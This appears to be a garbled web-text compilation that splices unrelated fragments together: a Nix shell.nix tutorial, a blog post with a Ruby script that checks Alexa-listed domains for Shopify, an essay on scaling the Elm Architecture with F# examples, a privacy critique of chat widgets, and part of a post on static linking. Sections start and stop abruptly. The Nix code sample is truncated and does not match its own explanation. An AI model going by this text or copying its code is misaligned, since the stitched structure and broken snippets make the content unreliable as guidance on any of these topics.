            <p>The possibilities are endless, and access to the API is easy.</p>

<p>In <a href="https://nix.dev/tutorials/ad-hoc-developer-environments.html#ad-hoc-envs"><span>Ad hoc developer environments</span></a> tutorial we took a dive into providing shell
environments for when we need a quick’n’dirty way of getting hold
of some tools.</p>
<p>In this tutorial we’ll take a look how to create <a href="https://nix.dev/glossary.html#term-reproducible"><span>reproducible</span></a>
shell environments given a declarative configuration file called a Nix expression.</p>
<div id="when-are-declarative-shell-environments-useful">
<h2>When are declarative shell environments useful?<a href="#when-are-declarative-shell-environments-useful" title="Permalink to this headline">¶</a></h2>
<p>This is the quickest approach to getting started with Nix:</p>
<ul>
<li><p>single command to invoke it via <code><span>nix-shell</span></code></p></li>
<li><p>works across different operating systems (Linux / MacOS)</p></li>
<li><p>share the exact same environment with all developers</p></li>
</ul>
<p>Developer environments allow you to:</p>
<ul>
<li><p>provide CLI tools, such as <code><span>psql</span></code>, <code><span>jq</span></code>, <code><span>tmux</span></code>, etc</p></li>
<li><p>provide developer libraries, such as <code><span>zlib</span></code>, <code><span>openssl</span></code>, etc</p></li>
<li><p>set shell environment variables</p></li>
<li><p>execute bash during environment activation</p></li>
</ul>
</div>
<div id="getting-started">
<h2>Getting started<a href="#getting-started" title="Permalink to this headline">¶</a></h2>
<p>In top-level of your project create <code><span>shell.nix</span></code> with the following contents:</p>
<div><div><pre><span></span><span>{</span> pkgs <span>?</span> <span>import</span> <span>(</span>fetchTarball <span>"https://github.com/NixOS/nixpkgs/archive/3590f02e7d5760e52072c1a729ee2250b5560746.tar.gz"</span><span>)</span> <span>{}</span> <span>}:</span>

    pkgs<span>.</span>htop
    pkgs<span>.</span>zlib
  <span>];</span>
<span>}</span>
</pre></div>
</div>

<p>We import <code><span>nixpkgs</span></code> and make a shell with <code><span>which</span></code> and <code><span>htop</span></code> available in <code><span>$PATH</span></code>.
<code><span>zlib</span></code> provides libraries and headers in case we’re compiling something against it.
To enter the environment:</p>
<div><div><pre><span></span><span>$</span> nix-shell
<span>these paths will be fetched (0.07 MiB download, 0.20 MiB unpacked):</span>
<span>  /nix/store/072a6x7rwv5f8wr6f5s1rq8nnm767cfp-htop-2.2.0</span>
<span>copying path '/nix/store/072a6x7rwv5f8wr6f5s1rq8nnm767cfp-htop-2.2.0' from 'https://cache.nixos.org'...</span>

<span>[nix-shell:~]$</span>
</pre></div>
</div>
<p>The command will start downloading the missing packages from <a href="https://cache.nixos.org/">https://cache.nixos.org</a> binary cache.</p>
<p>Once it’s done, you are dropped into a new
shell. This shell provides the packages specified in <code><span>shell.nix</span></code>.</p>
<p>Run <code><span>htop</span></code> to confirm it is present. Quit the program by hitting
<code><span>Q</span></code>.</p>
<p>Now, try <code><span>which</span> <span>htop</span></code> to check where the <code><span>htop</span></code> command is on-disk.
You should see something similar to this:</p>
<div><div><pre><span></span><span>[nix-shell:~]$</span> which htop
<span>/nix/store/y3w2i8kfdbfj9rx287ad52rahjpgv423-htop-2.2.0/bin/htop</span>

<h5>How I outperformed BuiltWith and PublicWWW’s free plans with a couple hours and 30 lines of code.</h5>

<p>What if you wanted to find a list of websites that are using a specific piece of technology? Like if you wanted a list of all websites using WordPress? <strong>Or in my case, all websites built with Shopify?</strong></p>



<p>You might turn to <a href="https://builtwith.com/">BuiltWith</a> or <a href="https://publicwww.com/">PublicWWW</a>. These sites scan the source code of websites to determine the technology the website is built on. </p>



<p>Very useful and cool! Until you see the pricing pages:</p>



<figure><img src="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM-1024x517.png" alt="" srcset="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM-1024x517.png 1024w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM-300x151.png 300w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM-768x388.png 768w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM.png 1214w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Now, let me just say – I get it. </p>



<p>The work they’re doing ain’t easy, and the pricing is justifiable, <strong>but I know how to code, like a fun challenge, and can’t help but wonder if I can build my own version?</strong></p>



<p>Let’s find out…</p>



<p><strong>The way I see it, this problem has two components:</strong></p>



<ol><li>I need a script that can automatically check, when supplied a website domain, if that website is using Shopify or not.</li><li>I need a really big list of website domains to run the first script against.<br></li></ol>



<p>Once I have both of those pieces, I can put them together to make my Bootleg Builtwith. </p>



<h2>Part 1: Determining if a certain website uses Shopify</h2>



<p>Let’s start with the first component: When given a website URL, I need a reliable method to check if that website uses Shopify.</p>



<p>The simplest way to check if a website is using Shopify is to inspect the website source, and look for code that only a Shopify store would use.</p>



<p>Now, I already know of such a snippet that is unique to Shopify stores: It’s ‘trekkie’ – which is what Shopify calls their custom analytics solution:</p>



<figure><img src="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-3.14.56-PM.png" alt="" srcset="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-3.14.56-PM.png 753w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-3.14.56-PM-300x102.png 300w" sizes="(max-width: 753px) 100vw, 753px"></figure>



<p>Cool. Let’s use that as a base point and start coding.</p>



<p>Let’s write a dead simple, 15 line, Ruby script to kick this off:</p>



<pre><code lang="ruby">require 'open-uri'

# Prompt me for a URL 
puts "What URL do you want to check?"
url = gets.chomp

# Open the URL I supplied above
html = open(url).read

# Checks the source code for the Shopify specific code snippet
if html.include? "var trekkie = window.ShopifyAnalytics.lib"
	puts 'This site uses Shopify'
else
	puts 'This site does not use Shopify'
end 
 </code></pre>



<p>Cool. Let’s run it, and try testing it against a couple websites to make sure it’s reliable:</p>



<figure><video controls="" src="https://emersoncode.com/blog/wp-content/uploads/2020/07/My-Movie-Medium.mov"></video></figure>



<ul><li>First test using a Shopify site =&gt; https://emerson-code-development.myshopify.com<ul><li>That worked. Let’s try a different Shopify website:</li></ul></li><li>Second test with another Shopify site =&gt; https://allbirds.com<ul><li>Once again, looking good. Now let’s try a website that definitely doesn’t use Shopify.</li></ul></li><li>Third test with a site that doesn’t use Shopify =&gt; https://amazon.com<ul><li>Error!</li></ul></li></ul>



<p>Ah, yes, I should’ve anticipated this but Amazon blocks my script from inspecting the website source code here. </p>



<p>Now I could get crazy and break out a more sophisticated scraping solution like <a href="http://watir.com/">Watir</a> but remember this is bootleg, so let’s think through that extra work for a second…</p>



<p>So if Shopify stores don’t block my script, can’t I just assume that if my script is blocked, that it’s not a Shopify store? Makes sense to me. Let’s do that:</p>



<pre><code lang="ruby">begin
		html = open(url).read

		if html.include? "var trekkie = window.ShopifyAnalytics.lib"
			puts url + ': This site uses Shopify'
			# It's a match! Let's write it to a CSV
			CSV.open("/Users/emerson/Downloads/results-shopify-stores.csv", "a") do |csv|
			  csv &lt;&lt; [url]
			end
		else
			puts url + ': This site does not use Shopify'
		end 
	rescue
		puts url + ': Blocked. Probably does not use Shopify'
	end</code></pre>



<p>Okay. Bingo. Part 1’s solution is decent enough.</p>



<h2>Part 2: Get a big list of websites</h2>



<p><strong>Onto the next one: </strong>I need a massive list of domains to check.</p>



<p>Search engines typically use something called spiders here to find and create directories/lists of webpages. Spiders start at one webpage, follow all the links on that webpage, and then the links on those webpages, and so on until it has mapped all the webpages it can get its hands on.</p>



<p>Now if you wanted to build a Builtwith competitor you’d probably need to do something like that, but this is bootleg baby!</p>



<p>I remember Alexa.com has a list of the top million website domains or whatever. I wonder if they make the list publicly available? Surely that’d give me a lot of high ranking websites to check, and high ranked websites are what we’d prefer here anyway, right?</p>



<p>A quick google search revealed <a rel="noreferrer noopener" href="https://gist.github.com/chilts/7229605" target="_blank">this</a> Github thread with some decent leads, and from that thread I have a downloaded CSV of the ‘top million domains’.</p>



<p>Checking the spreadsheet, it only has 764,166 domains, not 1 million… Good enough!</p>



<p>Let’s start with a couple lines of Ruby code that can use a CSV spreadsheet file as an input, and loop through each domain to perform my Shopify check I outlined in part 1.</p>



<p>Oh yeah… the domain list only includes the URL’s base: Eg bestbuy.com, not https://www.bestbuy.com. That’s okay, let’s just assume most domains are using https:// and prepend it to the start of every URL before we check it:</p>



<pre><code lang="ruby">url = 'https://' + url</code></pre>



<p>Cool. One last thing. If my script does detect a Shopify store, let’s go ahead and save that to a separate CSV to serve as my output, so when my scripts finished, I’m left with just list of websites using Shopify.</p>



<pre><code lang="ruby">if html.include? "var trekkie = window.ShopifyAnalytics.lib"
   puts url + ': This site uses Shopify'
   # It's a match! Let's write it to a separate CSV
   CSV.open("/Users/emerson/Downloads/results-shopify-stores.csv", "w") do |csv|
      csv &lt;&lt; [url]
   end
else
...</code></pre>



<p>Okay… One hour later and I barely have gotten through 1000 URLs, and none of those are Shopify sites it seems. </p>



<p>Make sense. If you’re one of the top websites in the world, it’d make sense that you’d be using a custom platform to run it.</p>



<p>Given that, to make this a little bit easier, let’s go ahead and skip the first 50K top sites and start scanning at 50,001:</p>



<pre><code lang="ruby">domainList = CSV.read('/Users/emerson/Downloads/top-1m.csv', headers:true)

domainList.drop(50000).each do |row|
    url = row[1]
    url = 'https://' + url
    isUsingShop(url)
end
</code></pre>



<p>A couple minutes later and we got one! </p>



<figure><img src="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.21.48-PM.png" alt="" srcset="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.21.48-PM.png 517w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.21.48-PM-300x240.png 300w" sizes="(max-width: 517px) 100vw, 517px"></figure>



<p>After letting that script run in the background for a few hours, I’ve checked about ~12K domains (Alexa’s top 50K-62K domains), and found ~220 of those sites are using Shopify. So 1.83% of the so far checked domains were using Shopify.</p>



<p>Quick and dirty math: Roughly 700K domains still need to be checked. Assuming similar positive rate as the domains I have checked so far, my bootleg script should produce a list of 10K+ high ranking Shopify stores.</p>



<p><strong>Free BuiltWith: 50 high ranking Shopify stores</strong></p>



<p><strong>Free PublicWWW: 2359 high ranking Shopify stores</strong></p>



<p><strong>30 lines of Ruby code: 10K+ high ranking Shopify stores</strong>* (Estimated, will update when I have final numbers)</p>



<p>Update 1: After running the script for 20 hours in the background, I’ve checked about ~3% of Alexa’s top domain list, and produced a list of 900 Shopify stores. Cya in a week for final results.</p>



<h3>To be continued!</h3>



<p>Also, here is complete Ruby script:</p>



<pre><code lang="ruby">require 'csv'
require 'open-uri'

def isUsingShop(url)
	begin
		html = open(url).read

		if html.include? "var trekkie = window.ShopifyAnalytics.lib"
			puts url + ': This site uses Shopify'
			# It's a match! Let's write it to a CSV
			CSV.open("/Users/emerson/Downloads/results-shopify-stores.csv", "a") do |csv|
			  csv &lt;&lt; [url]
			end
		else
			puts url + ': This site does not use Shopify'
		end 
	rescue
		puts url + ': Blocked. Probably does not use Shopify'
	end
end 

domainList = CSV.read('/Users/emerson/Downloads/top-1m.csv', headers:true)

domainList.drop(50001).each do |row|
    url = row[1]
    url = 'https://' + url

    isUsingShop(url)

end

<![CDATA[Does the Elm Architecture Scale?]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
    
    <p>You've learned about MVU and started building a real app that is now growing beyond its first view. Now you are wondering: How can that be structured, how does it scale? Does it scale at all?</p>
    
    <p>I bet that everyone who does get started with "The Elm Architecture" sooner or later arrives at that point. No matter if they use <a href="https://elm-lang.org/">Elm</a>, <a href="https://elmish.github.io/elmish/">Elmish</a>, <a href="https://fsprojects.github.io/Fabulous/">Fabulous</a>, or other libraries and frameworks. So you are not alone. And it caused me to scratch my head, too.</p>
<h2>The Problem</h2>
<p>When looking at the <a href="https://thomasbandt.com/model-view-update">ubiquitous counter examples</a>, the advantages of MVU quickly become apparent. Besides other things, the uni-directional dataflow makes it very easy to reason about a program. At least for such simplistic scenarios.</p>
<p>In real-world scenarios, however, the number of messages and the size of your update function will quickly grow. You will want to split your first program into multiple parts, be it multiple "pages" or "widgets."</p>
<p>To maintain the single message loop you will need to break up your program into parents and their children. The entire process is being described in the wonderful Elmish Book. If you want to learn more first, I recommend taking a break and read its <a href="https://zaid-ajaj.github.io/the-elmish-book/#/chapters/scaling/splitting-programs">chapter about splitting programs</a> first.</p>
<p>What you will end up with is a set of relatively slim children. Which do not know anything about their parents nor their siblings. That's the plus. The downside: Parents need to know a lot about their kids. In fact, for specific scenarios, you will need to intercept messages sent by children in one of their parents. Or you will introduce an additional message type that is being used for "external communication" (<a href="https://zaid-ajaj.github.io/the-elmish-book/#/chapters/scaling/intent">the intent pattern</a>).</p>
<p>As a result, a parent's update function will be not only dealing with its own logic, but it will also handle a lot of things for its children. Which will probably feel counter-intuitive, to say the least.</p>
<p>So what can be done? Well, it depends on what you want to sacrifice. There's no such thing as free lunch, as always.</p>
<h2>Option 1: Embrace The Original Idea</h2>
<p>Yes, MVU will make you write <em>a lot</em> of boilerplate code. Yes, every component of your application will look the same. But that can be considered a good thing. Because it narrows down the "implementation path" massively. There's not much room left to do something wrong.</p>
<p>Which might pay off in the long run. You will probably be able to easily reason about the behavior of the application after a long time. You won't end up with different implementation styles that depend on the person who worked on it last and their state of knowledge. This also means that it will probably make it easier for new team members to understand what is happening and to get started.</p>
<p>Bonus: Even if they break the whole application by changing something, the compiler will tell them very early. And the moment they mastered their first component, they have learned most of what is needed to continue to work on different parts of the application.</p>
<p>Another positive side-effect: You free yourself from all the trends and hypes of our industry, at least for the scope of the particular project you're choosing to work with MVU. For Elmish, for example, the view might still end up being rendered with React â€“ but that's just an infrastructure layer below your application. React moves from classes to functions, or it introduces new features that break existing patterns? You don't need to care, you can stay in your comfort zone on top of all that.</p>
<h2>Option 2: Split It Up</h2>
<p>If you still have a hard time committing yourself to write code you do not want to write, no matter what, you can break the whole thing into multiple programs. Although it may seem counter-intuitive at first, it is what <a href="https://github.com/elmish/Elmish.WPF">some</a> <a href="https://thomasbandt.com/mvu-for-native-xamarin-apps">MVU implementations</a> have to do anyway.</p>
<p>So how do you do that? Well, it depends on what you are building. For mobile applications with Fabulous, you might want to keep building your app with ordinary pages. The same goes for web applications: There is nothing wrong with having multiple (server-side rendered) pages that host an independent Elm(ish) program.</p>
<p>For web applications built with Elmish, there's even one more option. The <a href="https://github.com/Zaid-Ajaj/Feliz">Feliz project</a> from Zaid Ajaj offers a React hook called <a href="https://zaid-ajaj.github.io/Feliz/#/Hooks/UseElmish">Feliz.UseElmish</a>. This allows you to build a (more or less) normal React application written in F# and composed of different React function components, which internally can use MVU if needed. This way, you can build simple components (think of navigation elements) without an artificial message loop. And still leverage all the advantages of MVU in case it makes sense.</p>
<p><em>A simple React function component without MVU (<a href="https://github.com/aspnetde/typesafe-spa/blob/master/src/FelizFunctionComponents/src/Authenticated/Dashboard.fs">source</a>):</em></p>
<pre><code>module Dashboard

open Feliz

let render = React.functionComponent(fun () -&gt;
    let context = React.useContext AppContext.instance
    Html.textf "Welcome, %s! " context.Session.User
)
</code></pre>
<p><em>A more sophisticated component with some internal logic that is worth to be implemented following MVU (<a href="https://github.com/aspnetde/typesafe-spa/blob/master/src/FelizFunctionComponents/src/Anonymous/Login.fs">source</a>):</em></p>
<pre><code>module Login

type private State =
    { UserName: string
      Password: string
      Error: string option }

type private Msg =
    | UserNameSet of string
    | PasswordSet of string
    | StartLogin of AppContext.ContextData
    | LoginFailed of string
    | LoginCompleted

let private init() = { UserName = ""; Password = ""; Error = None }, Cmd.none

let private updateSession (context: AppContext.ContextData) user =
    context.SetSession({ context.Session with User = user })
    LoginCompleted

let private validateCredentials context state =
    if state.UserName = "user" &amp;&amp; state.Password = "test" then
        state, Cmd.ofMsg (updateSession context state.UserName)
    else
        state, Cmd.ofMsg (LoginFailed "Oops, user name or password are incorrect.")

let private update msg state =
    match msg with
    | UserNameSet userName -&gt; { state with UserName = userName }, Cmd.none
    | PasswordSet password -&gt; { state with Password = password }, Cmd.none
    | StartLogin context -&gt; validateCredentials context state
    | LoginFailed error -&gt; { state with Error = Some(error) }, Cmd.none
    | LoginCompleted -&gt; state, AuthenticatedUrl.Dashboard.Navigate()

let render = React.functionComponent(fun () -&gt;
    let state, dispatch = React.useElmish(init, update, [| |])
    let context = React.useContext AppContext.instance

    Html.div [
        Html.div [
            prop.text state.Error.Value
            prop.hidden state.Error.IsNone
        ]
        Html.input [
            prop.type'.text
            prop.placeholder "User name"
            prop.onChange (UserNameSet &gt;&gt; dispatch)
        ]
        Html.input [
            prop.type'.password
            prop.placeholder "Password"
            prop.onChange (PasswordSet &gt;&gt; dispatch)
        ]
        Html.button [
            prop.onClick (fun _ -&gt; dispatch (StartLogin context))
            prop.text "Get in"
        ]
    ]
)
</code></pre>
<p>What you will obviously lose that way is the advantages of a single application-wide message loop. You will need to find alternative measures to communicate between parents and their children, or different components at different places at the tree. But when you came this far, you for sure will find a suitable solution for that, too (hint: in the sample above, <a href="https://zaid-ajaj.github.io/Feliz/#/Feliz/React/ContextPropagation">React Context</a> was used).</p>
<h2>Conclusion</h2>
<p>Model-View-Update is a powerful concept, but it's far from perfect when applied in real-world applications. Whether or not this becomes a problem for you depends on what you are willing to make compromises for. No surprise, there is no free lunch.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>An analysis of the data collected and shared by Drift, Intercom, and Crisp</h2><p><img src="https://letterbase.io/blog/how-customer-support-tools-violate-privacy/post-banner.png"></p></div><p>There’s a privacy problem with customer support tools.</p><p>You know: those chat widgets on the bottom right corner of websites. You may have heard of Intercom, Drift, Crisp, or other companies who offer these types of embeddable widgets.</p><p>They’re getting more and more popular across the Internet because they let website owners talk with their visitors with minimum friction.</p><p>Unfortunately, that’s not the only thing they do. These widgets collect absurd amounts of data on website visitors and are often built in a way that is fundamentally opposed to user privacy.</p><p>Let’s take a look at three popular chat widgets—Drift, Intercom, and Crisp—and analyze how they invade your privacy.</p><h2>Drift</h2><h3>1. They connect your identity information with information from third parties</h3><p>While I was browsing Drift’s website, I noticed a message pop up:</p><p><img src="https://letterbase.io/blog/how-customer-support-tools-violate-privacy/drift-message.png" alt="Drift uses third parties to glean your employment information" data-zoomable="true"></p><p>It seems like they’re <strong>using my IP address to create personalized messages</strong>—in this case, targeting the company I work at. This means they’re likely transferring my IP address and other information to third parties.</p><p>Looking at their <a href="https://www.drift.com/gdpr/" target="_blank" rel="noopener noreferrer nofollow">GDPR page</a> confirms it—they use a whopping <em>three</em> “Data Enrichment” subprocessors (one is apparently not enough for them):</p><p><img src="https://letterbase.io/blog/how-customer-support-tools-violate-privacy/drift-data-subprocessors.png" alt="Drift uses three data subprocessors to target messages to you" data-zoomable="true"></p><p>These subprocessors are companies that collect and sell reams of public and private information about people. I’m wary of trusting any company that uses them!</p><p>The cherry on top is that despite using so many sources, Drift’s “Data Enrichment” doesn’t even work all that well. I have never even <em>heard</em> of PubMatic, much less work there!</p><h3>2. They track your location and many other types of information</h3><p><a href="https://www.drift.com/privacy-policy/" target="_blank" rel="noopener noreferrer nofollow">Drift’s privacy policy</a> has a disconcerting “Location Information” section:</p><blockquote><p>We use and store information about your general location. We use this information to provide features of our Services and to improve and customize our Services.</p></blockquote><p>Why does a chat widget need to know my location? It doesn’t seem like this is crucial to helping website owners provide better customer support.</p><p>But that’s not the only thing they collect. If you look at their “CCPA Privacy Statement” section, they provide some more detailed information:</p><p><img src="https://letterbase.io/blog/how-customer-support-tools-violate-privacy/drift-data.png" alt="The many types of data that Drift collects" data-zoomable="true"></p><p>This is a staggering amount of information—for just a simple chat widget!</p><p>Notably, Drift collects “Information on a consumer’s interaction with a website, application, or advertisement.” This means that <strong>Drift and website owners can essentially spy on your website activity</strong>, including what pages you visit and how long you spend on each page.</p><p>Don’t analytics services also collect this kind of data? Yes, but at least they aggregate and anonymize it.</p><p>In contrast, the website activity that Drift collects is tied directly to your identity. They know exactly what you specifically have done. That’s the only way they can show targeted material (like messages) to you based on your website activity.</p><h3>3. They track your website activity very closely</h3><p>Drift tracks all of the clicks that you make on their website—<strong>even when you’re not clicking on a link or a button</strong>. In the video below, Drift sends a network request for every click I make on their website—even if I am simply clicking on text.</p><video src="https://letterbase.io/blog/how-customer-support-tools-violate-privacy/drift-click-tracking.mp4" autoplay="" loop="" muted="" playsinline="" controls=""></video><p>That’s not to mention the <strong>16 trackers</strong> (according to uBlock Origin) that they have on their home page! Why does a website need so many trackers? I literally feel unsafe browsing their website without an ad blocker.</p><p>Even if the click tracking or trackers are only present on Drift’s landing page (and not on websites that install Drift), it doesn’t exactly inspire confidence in how much Drift cares about your privacy.</p><h2>Intercom</h2><h3>1. They collect many types of information</h3><p>Drift is not the only customer support tool that collects copious amounts of data. <a href="https://www.intercom.com/legal/privacy" target="_blank" rel="noopener noreferrer nofollow">Intercom does as well</a>:</p><p><img src="https://letterbase.io/blog/how-customer-support-tools-violate-privacy/intercom-data.png" alt="Intercom collects lots of data" data-zoomable="true"></p><p>This data includes sensitive data like your geolocation, employment information, “pages you view, items you click, advertisements you interact with, and social media content you engage with.”</p><p>They use all of this data to draw “inferences” and <strong>“create a profile reflecting your preferences, characteristics, and behavior.”</strong></p><p>Sounds suspiciously like what advertising companies do! I thought this was a customer support company?</p><h3>2. They connect your identity information with information from third parties</h3><p>According to Intercom’s <a href="https://www.intercom.com/legal/privacy" target="_blank" rel="noopener noreferrer nofollow">Privacy Policy</a>, Intercom uses a third party data provider called FullContact. Here’s what it does:</p><blockquote><p>FullContact <!-- -->[…]<!-- --> enable<!-- -->[s]<!-- --> you <!-- -->[the website owner]<!-- --> to retrieve publicly-available information about People including without limitation <strong>social media information, profile information, gender, company, job titles, photos, physical addresses, and website URLs based on People’s email addresses input into the Services.</strong></p></blockquote><p>Why does Intercom think this is okay? If I’m providing them with a piece of information like my name, why do they think I consent to them using my name to find out even more information about me—like my physical address, gender, and what company I work for?</p><p>If you scroll further down, you can see Intercom’s justification for working with these types of companies:</p><blockquote><p>Even if the third party is affiliated with us through a business partnership or otherwise, we are not responsible for the privacy practices of such third party.</p></blockquote><p>Yes, because you totally have no control over what third parties you work with.</p><h3>3.

Your conversation data is shared with third parties</h3><p>It’s fairly common to send sensitive information like credit card information or your physical address in a support request.</p><p>Thus, you would think your conversations in Intercom would be private. <a href="https://www.intercom.com/legal/privacy" target="_blank" rel="noopener noreferrer nofollow">Think again</a>:</p><blockquote><p>We may share your personal information with third-party service providers to permit such parties to provide services that help us with our business activities <!-- -->[…]<!-- -->.

Here’s a few things that I found out from poking around their website and product.</p><h3>1. Website owners who use Crisp can see exactly what you’re seeing on the website</h3><p>Crisp provides their customers with a feature called <a href="https://crisp.chat/en/livechat/co-browsing/" target="_blank" rel="noopener noreferrer nofollow">MagicBrowse</a>, which “lets you <!-- -->[website owners]<!-- --> co-browse with your customers without any other plugin.” This feature lets website owners take control of their users’ screens—presumably with their consent.</p><p>What they don’t advertise about MagicBrowse is that website owners can use it to see a <strong>live view of exactly what you’re seeing on their website—even without your explicit consent</strong>!</p><video src="https://letterbase.io/blog/how-customer-support-tools-violate-privacy/crisp-live-view.mp4" autoplay="" loop="" muted="" playsinline="" controls=""></video><p>This is the equivalent of someone watching over your shoulder as you browse the Internet—without you even knowing they’re there.</p><h3>2. They use third-party cookies</h3><p>Crisp uses third-party cookies, which <strong>allows them to personally track you across all websites that have the Crisp chat widget on it!</strong></p><p>They could theoretically build up a cross-domain profile of all of your information and messages across all websites with the Crisp widget. This is an incredible violation of privacy!</p><p>There’s no reason any privacy-respecting company would be using third-party cookies. In fact, I would highly suggest blocking all third party cookies by default in your browser. Here’s what it looks like in Chrome:</p><p><img src="https://letterbase.io/blog/how-customer-support-tools-violate-privacy/chrome-third-party-cookies.png" alt="Chrome block third party cookies setting" data-zoomable="true"></p><h3>3. They connect your identity information with information from third parties</h3><p>Read this excerpt from Crisp’s <a href="https://help.crisp.chat/en/article/whats-crisp-eu-gdpr-compliance-status-nhv54c/" target="_blank" rel="noopener noreferrer nofollow">GDPR page</a>:</p><blockquote><p>Crisp resolves end-user identity information (first and last name, avatar, company) from external APIs. Those external APIs source this data from public information that the end-user consented to share on a third-party service (eg. on social networks such as LinkedIn or Twitter). This end-user identity information is stored on Crisp services, for as long as the Crisp customer wishes them to be stored in their Crisp CRM database.</p></blockquote><p>Basically, Crisp is Internet stalking you. If you provide any small piece of information about yourself, they’ll scour the Internet with that information to see if they can scrounge up more information about you from other websites. This is creepy if a person does it, and even more creepy when a company is doing it.</p><p>If you’re providing your name, then that should be the extent of what the website owner or Crisp knows about you.

<p>Static vs dynamic linking usually has to do with our tolerance for the size of our final executable. A<em> static </em>executable contains all code necessary to run the executable, so the operating system loads the executable into memory, and it’s off to the races. However, if we keep duplicating code over and over again, such as printf, then it starts to use up more and more space. So, a <em>dynamic</em> executable means that we only store <em>stubs</em> in the executable. Whenever we want to access printf, it goes out to a <em>dynamic linker</em> and loads the code essentially <em>on demand</em>. So, we sacrifice a tiny bit of speed for a much smaller executable.</p>

<h2 id="linking">What is Linking?</h2>



<p>When I hear someone talk about <em>compiling</em> their program into an executable, they are really eliding over several stages. The definition of  compiling is to <em>produce something by combining information collected from different sources.</em> In computing, we generally think of compiling as turning a higher-level language, such as C, into a lower-level code, such as assembly.</p>



<p>The final stage before we get an executable is the <em>linking</em> stage. This is where we <em>link</em> (hence the name) all sources together to produce one coherent executable. This is also where all outstanding symbols need to be resolved. Symbol is just fancy for the name of a function or global variable.</p>



<p>We can take a look at <em>object code, </em>which is what we get after we assemble but before we link. Here’s an object dump of an example program.</p>



<pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void some_func(int a, int b);

int main(int argc, char *argv[]) {
	if (argc &lt; 3) {
		printf("Not enough arguments.\n");
		return -1;
	}

	int a = atoi(argv[1]);
	int b = atoi(argv[2]);

	some_func(a, b);

	return 0;
}</pre>



<p>This code produces the following object code, which I disassemble using objdump for RISC-V.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png" alt="" width="500" height="341" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png 667w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23-300x204.png 300w" sizes="(max-width: 500px) 100vw, 500px"></figure></div>



<p>Notice that the function some_func has been prototyped, but has not been defined. This will be the responsibility of the linker to find the symbol some_func and add it into our program. Notice what happens when I try to link this program without ever defining some_func.</p>



<pre>/opt/riscv_1/lib/gcc/riscv64-unknown-linux-gnu/9.2.0/../../../../riscv64-unknown-linux-gnu/bin/ld: /tmp/ccmgFc75.o:
<br>
in function .L2': test.c:(.text+0x62): undefined reference to some_func'
<br>
collect2: error: ld returned 1 exit status</pre>



<p>The linker is looking for the symbol some_func, but it cannot find it, so we get an <em>undefined reference</em>. We know this is at the linker stage because the error is “ld returned 1 exit status”. The “ld” means “linker”.</p>



<p>We also can see that the address of the function main is 0, this is because we haven’t linked a program. So, our object code just contains <em>bubbles</em> of code, which will then be placed into our executable at certain locations by the linker.</p>



<hr>



<h2 id="finding">Finding Symbols</h2>



<p>If we use the command <em>nm</em>, which is used to list symbols in an object file, we can see all of the <em>unresolved</em> symbols. Our object code is looking for these, but it doesn’t need to know where they are until we have a full executable program.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png" alt="" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png 317w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24-300x169.png 300w" sizes="(max-width: 317px) 100vw, 317px"></figure></div>



<p>You can see that in this object file, the linker has a little bit of work to do. It must find atoi, puts, and some_func, which are flagged as U for undefined symbols. When we execute the linker, we will specify certain libraries, such as -lc (the C library), which most of these symbols will be found. Our some_func has never been defined, so our linker cannot really succeed until we define it somewhere.</p>



<hr>



<h2 id="static">Static Libraries (archives)</h2>



<p>Archive files generally end in .a and contain code and other information that will be added to the final executable. Essentially, archive files are just a collection of object files into one file. Therefore, when we link to an archive file, we extract the actual code from the object code into our executable. The nice thing about archive files is that we don’t need to add ALL symbols into our executable–we only need those symbols that need to be used.</p>



<p>Usually, we have archive versions of all libraries to allow for <em>static</em> executables. These executables are those that don’t need any additional loading to run. In other words, these are self-contained files. The linker stage will pull in the code directly from the .a file into the executable, and all is done. The more code that the linker pulls in, the larger the executable will be.</p>



<p>Let’s go ahead and define some_func and see how linking works.</p>



<pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;

void some_func(int a, int b)
{
	printf("Data = %d\n", a * b);
}
</pre>



<p>It’s very simple, but the point is to have some code that the linker can pull in. Recall that the linker gave us an “undefined reference” error because we didn’t define some_func. Now, we have it defined, so let’s see what happens.</p>



<pre>riscv64-unknown-linux-gnu-gcc -static -o test test2.o test.o</pre>



<p>Notice that I’m using gcc still. This will automatically invoke the linker and pull in the necessary <em>start files</em>. If we invoke the linker directly, we have to define _start and tell the program how to start, or we would have to directly specify the start files.</p>



<p>I specify -static so that gcc will pull in only .a files. When we are done, the file <em>test</em> will be a fully-contained, static executable. If we take a look at this file, we can see that all of the “stuff” we need for this executable makes it a fairly large file.</p>



<pre>-rwxr-xr-x 1 smarz smarz 4687920 Jun 1 09:16 test</pre>



